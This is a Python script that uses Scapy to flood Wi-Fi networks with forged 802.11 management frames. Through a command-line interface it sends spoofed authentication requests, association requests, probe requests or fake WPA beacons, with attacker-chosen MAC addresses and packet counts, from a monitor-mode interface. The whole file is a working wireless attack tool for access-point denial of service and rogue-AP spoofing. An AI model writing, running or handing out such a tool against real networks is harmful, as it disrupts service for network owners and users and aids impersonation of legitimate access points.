from scapy.all import *
import argparse
import sys


class Flooder:
    subtypes = {
        "assocReq": 0,
        "reassocReq": 2,
        "probeReq": 4,
        "beacon": 8,
        "disassoc": 10,
        "authReq": 11,
        "deauth": 12,
    }

    def __init__(self, args):
        actions = {
            "authReq": self.authReqSender,
            "assocReq": self.assocReqSender,
            "probeReq": self.probeReqSender,
            "beacon": self.beaconSender,
        }

        self.source_addr = args["source_address"]
        self.dest_addr = args["destination_address"]
        self.packet_type = args["packet_type"]
        self.dot11 = Dot11(
                        type = 0,
                        subtype = self.subtypes[self.packet_type],
                        addr1 = self.dest_addr,
                        addr2 = self.source_addr,
                        addr3 = self.dest_addr
                    )
        self.count = args["count"]
        self.interface = args["interface"]
        self.ssid = args['ssid'] if args['ssid'] else None

        func = actions[self.packet_type]
        func()
        

    def authReqSender(self):
        dot11auth = Dot11Auth(
                        algo=0, 
                        seqnum=1, 
                        status=0
                    )
        
        frame = RadioTap()/self.dot11/dot11auth
        sendp(frame, iface=self.interface, count=self.count)


    def assocReqSender(self):
        dot11elt_1 = Dot11Elt(ID='SSID', info=self.ssid)
        dot11elt_2 = Dot11Elt(ID='Rates', info="\x82\x84\x0b\x16")
        
        frame = RadioTap()/self.dot11/Dot11AssoReq()/dot11elt_1/dot11elt_2    
        sendp(frame, iface=self.interface, count=self.count)


    def probeReqSender(self):
        dot11elt = Dot11Elt(ID='SSID', info=self.ssid, len=len(self.ssid) if self.ssid else 0)

        frame = RadioTap()/self.dot11/Dot11ProbeReq()/dot11elt
        sendp(frame, iface=self.interface, count=self.count)


    def beaconSender(self):
        beacon = Dot11Beacon(cap='ESS+privacy')
        dot11elt = Dot11Elt(ID='SSID',info=self.ssid, len=len(self.ssid))
        rsn = Dot11Elt(ID='RSNinfo', info=(
        '\x01\x00'
        '\x00\x0f\xac\x02'
        '\x02\x00'
        '\x00\x0f\xac\x04'
        '\x00\x0f\xac\x02'
        '\x01\x00'
        '\x00\x0f\xac\x02'
        '\x00\x00'))

        # RSN infos: taken from -> https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
        # rsn = Dot11Elt(ID='RSNinfo', info=(
        # '\x01\x00'              #RSN Version 1
        # '\x00\x0f\xac\x02'      #Group Cipher Suite : 00-0f-ac TKIP
        # '\x02\x00'              #2 Pairwise Cipher Suites (next two lines)
        # '\x00\x0f\xac\x04'      #AES Cipher
        # '\x00\x0f\xac\x02'      #TKIP Cipher
        # '\x01\x00'              #1 Authentication Key Managment Suite (line below)
        # '\x00\x0f\xac\x02'      #Pre-Shared Key
        # '\x00\x00'))            #RSN Capabilities (no extra capabilities)

        frame = RadioTap()/self.dot11/beacon/dot11elt/rsn
        sendp(frame, iface=self.interface, count=self.count)


        


if __name__ == '__main__':
    argparser = argparse.ArgumentParser(description='Flood 802.11 packets.')
    argparser.add_argument("-src", "--source_address", help="Source MAC address of the packet: '00:00:00:00:00:00' ", required=True)
    argparser.add_argument("-dst", "--destination_address", help="Destination MAC address of the packet: '11:11:11:11:11:11", required=True)
    argparser.add_argument("-p", "--packet_type", help="Type of the 802.11 packet.", choices=["authReq", "assocReq", "probeReq", "beacon"],required=True)
    argparser.add_argument("-c", "--count", help="Number of packets to sent.", default=1, type=int)
    argparser.add_argument("-i", "--interface", help="Interface (must be in monitor mode).", required=True)
    argparser.add_argument("-ssid", "--ssid", help="(AssocReq) SSID of target AP: 'ILoveYou' ")


    if 'assocReq' in vars(argparser.parse_args()).values() and not vars(argparser.parse_args())["ssid"]:
        print("'-ssid/--ssid' parameter required for assocReq option.")
        sys.exit()

    args = vars(argparser.parse_args())
    
    flooder = Flooder(args)  